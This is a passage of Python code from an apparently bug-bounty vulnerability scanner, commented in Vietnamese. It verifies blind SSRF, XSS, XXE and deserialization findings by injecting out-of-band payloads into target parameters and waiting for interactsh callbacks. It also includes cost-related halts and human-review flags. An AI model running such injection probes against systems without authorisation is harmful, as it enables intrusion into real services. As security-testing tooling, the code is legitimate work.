            "human_review_required": human_review,
            "evidence_path": evidence,
            "baseline_session_id": base_sid,
            "verify_session_id": poc_sid,
        }

    def _human_review_record() -> dict:
        """Cờ human review của class deserialization — đúng 1 nơi (#17)."""
        return {
            "human_review_required": True,
            "human_review_note": (
                "Payload chỉ chứng minh input được deserialize (ping-back "
                "URLDNS) — impact thật (RCE?) CẦN HUMAN REVIEW thêm trước "
                "khi report; severity đã ép trần thận trọng."
            ),
        }

    # không có param thì payload không có chỗ chèn — rejected ngay
    if not param:
        reason = "Candidate không có param để chèn payload OOB"
        evidence = write_oob_evidence(run_id, candidate_id, {
            "schema": "vulhunt.oob-evidence/1",
            "candidate_id": candidate_id,
            "run_id": run_id,
            "class": cls,
            "target": candidate.get("target"),
            **(_human_review_record() if human_review else {}),
            "analysis": {"signals": [], "patterns": ["no_param"],
                         "score": 0.0, "verdict": "rejected", "reason": reason},
            "callbacks": [],
        })
        await _update(_OOB_VERDICT_SQL, candidate_id, "rejected", 0.0, threshold,
                      reason, evidence, None)
        return _summary(
            verdict="rejected", score=0.0, reason=reason, signals=[],
            patterns=["no_param"], payload="", token=None, reg=None,
            callbacks=[], evidence=evidence, base_sid=None, poc_sid=None,
        )

    # registration per-Run (domain xoay vòng, không tái sử dụng chéo Run)
    reg = await ensure_registration(pool, run_id, client)
    token = candidate_token(candidate_id, new_nonce())
    payload = oob_payload(cls, token, reg["domain"])

    # payload gây cost (SMS/API tốn phí — Intigriti CoC) → HALT Run TRƯỚC khi
    # request nào đi ra; Candidate giữ lifecycle cũ, người dùng bấm Resume
    costly = find_costly_payload_pattern(payload)
    if costly:
        halt_reason = (
            f"payload OOB class '{cls}' chứa mẫu gây cost '{costly}' — cấm theo "
            "Code of Conduct Intigriti. Run bị HALT, không có request nào đi ra."
        )
        await guardrails.halt_run(pool, run_id, halt_reason)
        raise guardrails.RunHalted(halt_reason)

    if probe is None:
        from . import sandbox

        run = await sandbox.resolve_run(pool, run_id)
        if run is None:
            raise ValueError("không có Run nào — không thể xác minh qua sandbox")

        async def probe(script: str, target: str, _run: asyncpg.Record = run) -> dict:
            return await sandbox.run_verify_session(pool, _run, script, target)

    await _update(
        "UPDATE candidates SET status = 'verifying' WHERE id = $1 "
        f"RETURNING {CANDIDATE_COLS}",
        candidate_id,
    )
    verify_started = datetime.now(timezone.utc)

    async def _run_probe(req: dict) -> dict:
        res = await probe(build_http_probe_script(**req), candidate["target"])
        if res.get("status") == "blocked":
            await _update(
                f"UPDATE candidates SET status = $2 WHERE id = $1 RETURNING {CANDIDATE_COLS}",
                candidate_id, prev_status,
            )
            raise ProbeBlocked(res.get("reason") or "target bị chặn tại bridge")
        if res.get("status") == "error":
            await _update(
                f"UPDATE candidates SET status = $2 WHERE id = $1 RETURNING {CANDIDATE_COLS}",
                candidate_id, prev_status,
            )
            raise RuntimeError(
                f"lỗi môi trường sandbox: {res.get('reason') or res.get('stderr', '')}"
            )
        return res

    baseline_req = {
        "url": inject_param(candidate["target"], param, BENIGN_PARAM_VALUE),
        "method": "GET", "headers": {}, "body": None,
    }
    poc_req = {
        "url": inject_param(candidate["target"], param, payload),
        "method": "GET", "headers": {}, "body": None,
    }

    base_res = await _run_probe(baseline_req)
    poc_res = await _run_probe(poc_req)
    baseline = parse_probe(base_res.get("stdout") or "")
    poc = parse_probe(poc_res.get("stdout") or "")
    probe_error = baseline is None or poc is None

    # chờ callback trong cửa sổ wait_s — blind class quyết định bằng callback,
    # KHÔNG phải response (target fetch payload bằng server-side)
    callbacks: list[dict] = []
    patterns: list[str] = []
    end = time.monotonic() + wait_s
    while True:
        try:
            result = await poll_registration(pool, reg, client)
        except InteractshError:
            # server interactsh trục trặc giữa chừng (evict khỏi cache, 400…)
            # — ném tiếp cho tầng trên retry nhưng TRẢ LIFECYCLE VỀ CŨ trước,
            # không bỏ Candidate kẹt 'verifying' mãi (cùng contract với probe
            # blocked/error phía trên)
            await _update(
                f"UPDATE candidates SET status = $2 WHERE id = $1 "
                f"RETURNING {CANDIDATE_COLS}",
                candidate_id, prev_status,
            )
            raise
        callbacks.extend(
            m for m in result["matched"] if m["candidate_id"] == candidate_id
        )
        if callbacks:
            break
        remaining = end - time.monotonic()
        if remaining <= 0:
            break
        await asyncio.sleep(min(poll_s, remaining) if poll_s > 0 else 0.01)

    if not callbacks:
        # Race double-poll: interactsh /poll XOÁ data sau khi đọc, mà worker có
        # poller nền (poll_forever) poll CÙNG registration — poller nền lấy
        # callback trước thì inline poll luôn về rỗng. Đối chiếu DB (callback
        # poller nền đã lưu kèm evidence) trước khi kết luận no_oob_callback —
        # chỉ nhận callback về sau mốc bắt đầu verify để không nhặt rác vòng cũ
        async with pool.acquire() as conn:
            rows = await conn.fetch(
                "SELECT id, protocol, source, unique_id, full_id, occurred_at, "
                "received_at, raw_interaction FROM oob_callbacks "
                "WHERE candidate_id = $1 AND received_at >= $2 ORDER BY id",
                candidate_id, verify_started,
            )
        for r in rows:
            item = dict(r)
            item["raw_interaction"] = _parse_raw_interaction(item.get("raw_interaction"))
            callbacks.append(item)

    if callbacks:
        signals = ["oob_callback"]
        seen = {m["full_id"] for m in callbacks}
        protocols = sorted({m["protocol"] for m in callbacks})
        sources = sorted({m["source"].split(":")[0] for m in callbacks})
        # diễn giải callback theo cơ chế từng lớp — không gán chung "fetch"
        confirmed = {
            "ssrf": "server-side đã fetch payload ra Internet",
            "xss": "payload đã được xử lý và tải tài nguyên về interactsh "
                   "(trình duyệt có session đã thực thi payload)",
            "xxe": "server đã parse XML và resolve external entity",
            "deserialization": "server đã deserialize input (URLDNS ping-back)",
        }[cls]
        reason = (
            f"Target phát OOB callback về interactsh: {len(callbacks)} callback "
            f"({', '.join(protocols) or '—'}) từ {', '.join(sources) or '—'} — "
            f"{confirmed}"
        )
        if human_review:
            reason += (
                " · payload chỉ chứng minh deserialize/ping-back — CẦN HUMAN "
                "REVIEW impact trước khi report"
            )
        score = SCORE_OOB_CALLBACK
        verdict = "verified" if score >= threshold else "rejected"
    else:
        signals = []
        patterns.append("no_oob_callback")
        if probe_error:
            patterns.append("probe_error")
        reason = (
            f"Không có OOB callback về {reg['domain']} trong {wait_s:.0f}s — "
            "blind không xác nhận được (target có thể không fetch payload)"
        )
        if probe_error:
            reason += " · không đọc được cả profile response từ sandbox"
        score = 0.0
        verdict = "rejected"

    # deserialization verified: severity ép trần thận trọng (không tự claim RCE)
    new_severity = (
        cap_deser_severity(candidate.get("severity") or "info")
        if human_review and verdict == "verified"
        else None
    )

    def _profile_or_parse_error(p: ProbeProfile | None, res: dict | None) -> dict:
        if p is not None:
            return p.to_dict()
        if res is not None:
            return {"parse_error": True, "stdout_head": (res.get("stdout") or "")[:2000]}
        return {"skipped": True}

    evidence = write_oob_evidence(run_id, candidate_id, {
        "schema": "vulhunt.oob-evidence/1",
        "created_at": datetime.now(timezone.utc).isoformat(),
        "candidate_id": candidate_id,
        "run_id": run_id,
        "class": cls,
        "target": candidate.get("target"),
        "param": param,
        **(_human_review_record() if human_review else {}),
        "registration": {
            "id": reg["id"],
            "server_url": reg["server_url"],
            "domain": reg["domain"],
            "correlation_id": reg["correlation_id"],
        },
        "payload": payload,
        "token": token,
        "threshold": threshold,
        "baseline": _profile_or_parse_error(baseline, base_res),
        "poc": _profile_or_parse_error(poc, poc_res),
        "baseline_session_id": base_res.get("session_id"),
        "verify_session_id": poc_res.get("session_id"),
        "analysis": {
            "signals": signals,
            "patterns": patterns,  # pattern log (kể cả khi rejected)
            "score": score,
            "verdict": verdict,
            "reason": reason,
            "wait_s": wait_s,
            "poll_s": poll_s,
        },
        "callbacks": callbacks,
    })
    await _update(
        _OOB_VERDICT_SQL, candidate_id, verdict, score, threshold,
        reason if verdict == "rejected" else None, evidence, new_severity,
    )
    await add_log(
        pool, run_id,
        f"Verify OOB ({cls}) Candidate #{candidate_id}: {verdict} "
        f"(score {score:.2f} / ngưỡng {threshold:.2f}) · {len(callbacks)} callback "
        f"· patterns: {', '.join(patterns) or '—'}"
        + (" · human review required" if human_review else "")
        + (f" · evidence: {evidence}" if evidence else ""),
    )
    return _summary(
        verdict=verdict, score=score, reason=reason, signals=signals,
        patterns=patterns, payload=payload, token=token, reg=reg,
        callbacks=callbacks, evidence=evidence,
        base_sid=base_res.get("session_id"), poc_sid=poc_res.get("session_id"),
    )
